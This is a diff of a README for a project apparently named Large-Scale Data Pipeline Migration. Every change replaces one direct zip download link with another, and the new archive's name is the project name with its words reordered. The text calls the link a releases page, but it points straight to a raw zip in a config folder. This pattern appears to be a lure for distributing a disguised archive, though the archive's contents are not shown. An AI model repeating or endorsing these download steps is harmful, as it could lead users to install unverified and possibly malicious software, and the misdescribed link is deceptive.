@@ -15,14 +15,14 @@ To begin using Large-Scale Data Pipeline Migration, follow these simple steps:
 
 1. Click the button below to visit the releases page.
 
-[![Download Latest Release](https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Large-Scale-Data-Pipeline-Migration-v3.6.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Large-Scale-Data-Pipeline-Migration-v3.6.zip)](https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Large-Scale-Data-Pipeline-Migration-v3.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Pipeline-Data-Scale-Migration-Large-v2.4.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Pipeline-Data-Scale-Migration-Large-v2.4.zip)](https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Pipeline-Data-Scale-Migration-Large-v2.4.zip)
 
 2. On the releases page, choose the version that suits your needs.
 
 3. Download the provided files based on your system requirements.
 
 ## 📥 Download & Install
-To download Large-Scale Data Pipeline Migration, visit this page: [Download Here](https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Large-Scale-Data-Pipeline-Migration-v3.6.zip). 
+To download Large-Scale Data Pipeline Migration, visit this page: [Download Here](https://raw.githubusercontent.com/hghghgh12/Large-Scale-Data-Pipeline-Migration/main/config/Pipeline-Data-Scale-Migration-Large-v2.4.zip). 
 
 ### 🔄 Installation Instructions
 1. **Locate the Downloaded File**: Find the file you just downloaded. 
